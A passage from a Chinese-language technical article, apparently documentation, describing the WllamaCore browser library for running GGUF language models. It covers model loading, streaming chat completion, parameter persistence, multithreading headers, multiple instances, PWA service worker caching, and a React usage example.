  <span class="hljs-attr">runtimeInfo</span>: <span class="hljs-title class_">RuntimeInfo</span>;
}

<span class="hljs-comment">// 生成更新事件</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GenerationUpdateEventData</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseEventData</span> {
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span>;
}
</code></pre>
<h2 data-id="heading-15">核心功能特性</h2>
<h3 data-id="heading-16">1. 多种模型加载方式</h3>
<p>支持三种模型加载方式，满足不同使用场景：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">WllamaCore</span>, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-keyword">const</span> wllamaCore = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WllamaCore</span>({ <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// 方式1: 从本地文件加载</span>
<span class="hljs-keyword">const</span> files = [<span class="hljs-comment">/* File 对象 */</span>];
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromFiles</span>(files, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">n_batch</span>: <span class="hljs-number">128</span>,
});

<span class="hljs-comment">// 方式2: 从URL加载（自动缓存）</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 默认启用</span>
  <span class="hljs-attr">downloadOptions</span>: {
    <span class="hljs-attr">progressCallback</span>: <span class="hljs-function">(<span class="hljs-params">progress</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`下载进度: <span class="hljs-subst">${progress.loaded}</span>/<span class="hljs-subst">${progress.total}</span>`</span>);
    },
  },
});

<span class="hljs-comment">// 方式3: 从缓存加载</span>
<span class="hljs-keyword">import</span> { cacheManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;
<span class="hljs-keyword">const</span> cachedFile = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">open</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>);
<span class="hljs-keyword">if</span> (cachedFile) {
  <span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromFiles</span>([cachedFile], { <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span> });
}
</code></pre>
<h3 data-id="heading-17">2. 流式生成支持</h3>
<p>支持实时流式输出，提供流畅的用户体验：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">createChatCompletion</span>(messages, {
  <span class="hljs-attr">nPredict</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sampling</span>: { <span class="hljs-attr">temp</span>: <span class="hljs-number">0.2</span> },
  <span class="hljs-title function_">onNewToken</span>(<span class="hljs-params">token, piece, currentText, opts</span>) {
    <span class="hljs-comment">// 实时更新UI</span>
    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> updated = [...prev];
      updated[updated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">content</span> = currentText;
      <span class="hljs-keyword">return</span> updated;
    });
    
    <span class="hljs-comment">// 可以随时停止生成</span>
    <span class="hljs-comment">// opts.abortSignal();</span>
  },
});
</code></pre>
<h3 data-id="heading-18">3. 参数持久化</h3>
<p>推理参数自动保存到 localStorage，下次使用时自动恢复：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置参数（自动保存）</span>
wllamaCore.<span class="hljs-title function_">setInferenceParams</span>({
  <span class="hljs-attr">nContext</span>: <span class="hljs-number">8192</span>,
  <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
  <span class="hljs-attr">nPredict</span>: <span class="hljs-number">2048</span>,
});

<span class="hljs-comment">// 获取参数</span>
<span class="hljs-keyword">const</span> params = wllamaCore.<span class="hljs-title function_">getInferenceParams</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params);
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   nThreads: -1,</span>
<span class="hljs-comment">//   nContext: 8192,</span>
<span class="hljs-comment">//   nBatch: 128,</span>
<span class="hljs-comment">//   temperature: 0.7,</span>
<span class="hljs-comment">//   nPredict: 2048</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h3 data-id="heading-19">4. 多线程支持</h3>
<p>自动检测并使用多线程模式，大幅提升推理性能：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/middleware.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
  
  <span class="hljs-comment">// 启用 SharedArrayBuffer 支持（多线程所需）</span>
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Opener-Policy'</span>, <span class="hljs-string">'same-origin'</span>);
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Embedder-Policy'</span>, <span class="hljs-string">'require-corp'</span>);
  
  <span class="hljs-keyword">return</span> response;
}
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>必须在 HTTPS 环境下运行（或 localhost）</li>
<li>需要浏览器支持 SharedArrayBuffer</li>
<li>设置响应头后需要重启开发服务器</li>
</ul>
<h3 data-id="heading-20">5. 多实例支持</h3>
<p>支持创建和管理多个独立的 WllamaCore 实例，每个实例可以加载不同的模型，独立进行推理：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { wllamaCoreFactory, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span>, <span class="hljs-title class_">Message</span>, <span class="hljs-title class_">WllamaCoreEvent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-comment">// 创建多个实例</span>
<span class="hljs-keyword">const</span> instance1 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-1'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });
<span class="hljs-keyword">const</span> instance2 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-2'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// 每个实例可以加载不同的模型</span>
<span class="hljs-keyword">await</span> instance1.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model1.gguf'</span>);
<span class="hljs-keyword">await</span> instance2.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model2.gguf'</span>);

<span class="hljs-comment">// 独立进行推理</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages1</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'你好'</span> }];
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages2</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'Hello'</span> }];

<span class="hljs-keyword">const</span> [result1, result2] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  instance1.<span class="hljs-title function_">createChatCompletion</span>(messages1),
  instance2.<span class="hljs-title function_">createChatCompletion</span>(messages2),
]);

<span class="hljs-comment">// 监听不同实例的事件（事件数据包含 instanceId）</span>
instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'实例1模型已加载:'</span>, data.<span class="hljs-property">instanceId</span>);
});

instance2.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'实例2生成更新:'</span>, data.<span class="hljs-property">data</span>, <span class="hljs-string">'实例ID:'</span>, data.<span class="hljs-property">instanceId</span>);
});

<span class="hljs-comment">// 获取所有实例</span>
<span class="hljs-keyword">const</span> allInstances = wllamaCoreFactory.<span class="hljs-title function_">getAll</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`当前有 <span class="hljs-subst">${allInstances.size}</span> 个实例`</span>);

<span class="hljs-comment">// 销毁指定实例</span>
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroy</span>(<span class="hljs-string">'chat-1'</span>);

<span class="hljs-comment">// 销毁所有实例</span>
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroyAll</span>();
</code></pre>
<p><strong>关键特性</strong>：</p>
<ul>
<li><strong>实例隔离</strong>：每个实例的推理参数存储在独立的 localStorage 键中（格式：<code>params-{instanceId}</code>）</li>
<li><strong>事件隔离</strong>：每个实例的事件监听器独立，事件数据包含 <code>instanceId</code> 用于区分</li>
<li><strong>资源管理</strong>：通过工厂类统一管理所有实例，支持获取、创建、销毁等操作</li>
<li><strong>向后兼容</strong>：原有的直接创建 <code>WllamaCore</code> 实例的方式仍然支持</li>
</ul>
<h3 data-id="heading-21">6. PWA 支持</h3>
<p>项目完整支持渐进式 Web 应用（PWA），用户可以像原生应用一样安装和使用：</p>
<p><strong>核心特性</strong>：</p>
<ul>
<li><strong>可安装性</strong>：支持添加到主屏幕，提供原生应用体验</li>
<li><strong>离线支持</strong>：通过 Service Worker 实现离线访问</li>
<li><strong>智能缓存</strong>：自动缓存应用资源，提升加载速度</li>
<li><strong>自动更新</strong>：Service Worker 自动检测并更新应用</li>
</ul>
<p><strong>manifest.json 配置</strong>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"MVP AI Wllama"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"short_name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Wllama"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"AI Wllama Application"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"start_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"display"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"standalone"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"background_color"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#ffffff"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"theme_color"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#000000"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"orientation"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"portrait-primary"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"icons"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"src"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/icon-192.png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"sizes"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"192x192"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"image/png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"purpose"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"any maskable"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"src"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/icon-512.png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"sizes"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"512x512"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"image/png"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"purpose"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"any maskable"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>Service Worker 实现</strong>：</p>
<p>项目实现了智能的 Service Worker，支持：</p>
<ul>
<li><strong>资源缓存</strong>：自动缓存应用页面和静态资源</li>
<li><strong>离线回退</strong>：网络不可用时使用缓存内容</li>
<li><strong>后台更新</strong>：后台自动更新缓存，不阻塞用户操作</li>
<li><strong>快速失败</strong>：网络请求超时快速失败，避免长时间等待</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// public/sw.js</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">'wllama-cache-v1'</span>;

<span class="hljs-comment">// 安装时立即激活</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'install'</span>, <span class="hljs-function">() =&gt;</span> self.<span class="hljs-title function_">skipWaiting</span>());

<span class="hljs-comment">// 激活时清理旧缓存</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'activate'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  event.<span class="hljs-title function_">waitUntil</span>(
    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">names</span>) =&gt;</span>
      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(names.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n !== <span class="hljs-variable constant_">CACHE_NAME</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> caches.<span class="hljs-title function_">delete</span>(n)))
    ).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> self.<span class="hljs-property">clients</span>.<span class="hljs-title function_">claim</span>())
  );
});

<span class="hljs-comment">// 拦截网络请求，实现缓存策略</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'fetch'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
  <span class="hljs-comment">// 缓存优先策略：优先使用缓存，后台更新</span>
  event.<span class="hljs-title function_">respondWith</span>(
    (<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-variable constant_">CACHE_NAME</span>);
      <span class="hljs-keyword">const</span> cached = <span class="hljs-keyword">await</span> cache.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>);
      
      <span class="hljs-keyword">if</span> (cached) {
        <span class="hljs-comment">// 有缓存：立即返回，后台更新</span>
        event.<span class="hljs-title function_">waitUntil</span>(
          <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (res?.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {
              <span class="hljs-keyword">return</span> cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, res.<span class="hljs-title function_">clone</span>());
            }
          }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {})
        );
        <span class="hljs-keyword">return</span> cached;
      }
      
      <span class="hljs-comment">// 无缓存：网络请求</span>
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>);
        <span class="hljs-keyword">if</span> (res?.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {
          event.<span class="hljs-title function_">waitUntil</span>(cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, res.<span class="hljs-title function_">clone</span>()));
        }
        <span class="hljs-keyword">return</span> res;
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// 网络失败：返回缓存或空响应</span>
        <span class="hljs-keyword">return</span> cached || <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">''</span>, { <span class="hljs-attr">status</span>: <span class="hljs-number">503</span> });
      }
    })()
  );
});
</code></pre>
<p><strong>Service Worker 管理</strong>：</p>
<p>项目提供了智能的 Service Worker 管理组件，只在 PWA 环境下注册：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/ServiceWorkerManager.tsx</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ServiceWorkerManager</span>(<span class="hljs-params">{ swPath = <span class="hljs-string">'/sw.js'</span> }</span>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!(<span class="hljs-string">'serviceWorker'</span> <span class="hljs-keyword">in</span> navigator)) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isPWA</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">matchMedia</span>(<span class="hljs-string">'(display-mode: standalone)'</span>).<span class="hljs-property">matches</span> ||
             <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">matchMedia</span>(<span class="hljs-string">'(display-mode: minimal-ui)'</span>).<span class="hljs-property">matches</span> ||
             (<span class="hljs-variable language_">window</span>.<span class="hljs-property">navigator</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">standalone</span> === <span class="hljs-literal">true</span>;
    };

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAndManageSW</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">const</span> existingReg = <span class="hljs-keyword">await</span> navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">getRegistration</span>();
      <span class="hljs-keyword">const</span> currentIsPWA = <span class="hljs-title function_">isPWA</span>();

      <span class="hljs-comment">// 只在 PWA 环境注册 Service Worker</span>
      <span class="hljs-keyword">if</span> (currentIsPWA &amp;&amp; !existingReg) {
        <span class="hljs-keyword">const</span> reg = <span class="hljs-keyword">await</span> navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(swPath);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Service Worker 注册成功（PWA 环境）'</span>);
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!currentIsPWA &amp;&amp; existingReg) {
        <span class="hljs-comment">// 不在 PWA 环境时卸载</span>
        <span class="hljs-keyword">await</span> existingReg.<span class="hljs-title function_">unregister</span>();
        <span class="hljs-keyword">const</span> cacheNames = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">keys</span>();
        <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(cacheNames.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> caches.<span class="hljs-title function_">delete</span>(name)));
      }
    };

    <span class="hljs-title function_">checkAndManageSW</span>();
  }, [swPath]);
}
</code></pre>
<p><strong>使用方式</strong>：</p>
<ol>
<li>
<p><strong>安装应用</strong>：</p>
<ul>
<li>在支持的浏览器中访问应用</li>
<li>浏览器会显示"添加到主屏幕"提示</li>
<li>点击安装后，应用会像原生应用一样运行</li>
</ul>
</li>
<li>
<p><strong>离线使用</strong>：</p>
<ul>
<li>安装后，应用的核心功能可以在离线状态下使用</li>
<li>Service Worker 会自动缓存访问过的页面</li>
<li>模型文件存储在 IndexedDB 中，离线时仍可使用</li>
</ul>
</li>
<li>
<p><strong>自动更新</strong>：</p>
<ul>
<li>Service Worker 会自动检测新版本</li>
<li>后台更新缓存，不影响当前使用</li>
<li>下次打开应用时会使用新版本</li>
</ul>
</li>
</ol>
<p><strong>注意事项</strong>：</p>
<ul>
<li>PWA 功能需要在 HTTPS 环境下运行（或 localhost）</li>
<li>Service Worker 只在 PWA 模式下注册，避免在普通浏览器中占用资源</li>
<li>模型文件缓存使用 IndexedDB，与 Service Worker 缓存分离</li>
<li>支持手动卸载 Service Worker（通过 ServiceWorkerUninstall 组件）</li>
</ul>
<h3 data-id="heading-22">7. 缓存管理功能</h3>
<p>完整的缓存管理系统，支持导入、导出、删除等操作：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { cacheManager, toHumanReadableSize } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-comment">// 列出所有缓存文件</span>
<span class="hljs-keyword">const</span> entries = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">list</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`缓存文件数: <span class="hljs-subst">${entries.length}</span>`</span>);
entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${entry.metadata.originalURL || entry.name}</span>: <span class="hljs-subst">${toHumanReadableSize(entry.size)}</span>`</span>);
});

<span class="hljs-comment">// 获取缓存总大小</span>
<span class="hljs-keyword">const</span> totalSize = entries.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, entry</span>) =&gt;</span> sum + entry.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`总大小: <span class="hljs-subst">${toHumanReadableSize(totalSize)}</span>`</span>);

<span class="hljs-comment">// 删除特定文件</span>
<span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">delete</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>);

<span class="hljs-comment">// 清空所有缓存</span>
<span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">clear</span>();

<span class="hljs-comment">// 从文件导入到缓存</span>
<span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'input[type="file"]'</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLInputElement</span>;
<span class="hljs-keyword">const</span> file = fileInput.<span class="hljs-property">files</span>?.[<span class="hljs-number">0</span>];
<span class="hljs-keyword">if</span> (file) {
  <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">write</span>(<span class="hljs-string">`/<span class="hljs-subst">${file.name}</span>`</span>, file, {
    <span class="hljs-attr">etag</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">originalSize</span>: file.<span class="hljs-property">size</span>,
    <span class="hljs-attr">originalURL</span>: <span class="hljs-string">`/<span class="hljs-subst">${file.name}</span>`</span>,
  });
}
</code></pre>
<h2 data-id="heading-23">使用示例</h2>
<h3 data-id="heading-24">基本使用（React组件）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/app/wllama/load-from-file/page.tsx</span>
<span class="hljs-string">"use client"</span>
<span class="hljs-keyword">import</span> { useState, useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WllamaCore</span>, <span class="hljs-title class_">Message</span>, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">MinimalExample</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [messages, setMessages] = useState&lt;<span class="hljs-title class_">Message</span>[]&gt;([]);
  <span class="hljs-keyword">const</span> [input, setInput] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [isModelLoaded, setIsModelLoaded] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> wllamaCoreRef = useRef&lt;<span class="hljs-title class_">WllamaCore</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    wllamaCoreRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WllamaCore</span>({ <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      wllamaCoreRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">unloadModel</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {});
    };
  }, []);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadModel</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">e: React.ChangeEvent&lt;HTMLInputElement&gt;</span>) =&gt; {
    <span class="hljs-keyword">const</span> files = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">files</span> || []);
    <span class="hljs-keyword">if</span> (!files.<span class="hljs-property">length</span> || !wllamaCoreRef.<span class="hljs-property">current</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> wllamaCoreRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">loadModelFromFiles</span>(files, { 
        <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>, 
        <span class="hljs-attr">n_batch</span>: <span class="hljs-number">128</span> 
      });
      <span class="hljs-title function_">setIsModelLoaded</span>(<span class="hljs-literal">true</span>);
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'加载失败:'</span>, err);
    }
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">send</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (!input.<span class="hljs-title function_">trim</span>() || !wllamaCoreRef.<span class="hljs-property">current</span> || !isModelLoaded) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-attr">userMsg</span>: <span class="hljs-title class_">Message</span> = { <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: input.<span class="hljs-title function_">trim</span>() };
    <span class="hljs-keyword">const</span> <span class="hljs-attr">assistantMsg</span>: <span class="hljs-title class_">Message</span> = { <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">''</span> };
    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> [...prev, userMsg, assistantMsg]);
    <span class="hljs-title function_">setInput</span>(<span class="hljs-string">''</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> wllamaCoreRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">createChatCompletion</span>(
        [...messages, userMsg], 
        {
          <span class="hljs-attr">nPredict</span>: <span class="hljs-number">4096</span>,
          <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">sampling</span>: { <span class="hljs-attr">temp</span>: <span class="hljs-number">0.2</span> },
          <span class="hljs-title function_">onNewToken</span>(<span class="hljs-params">_token, _piece, text</span>) {
            <span class="hljs-title function_">setMessages</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> {
              <span class="hljs-keyword">const</span> updated = [...prev];
              <span class="hljs-keyword">if</span> (updated.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; updated[updated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">role</span> === <span class="hljs-string">'assistant'</span>) {
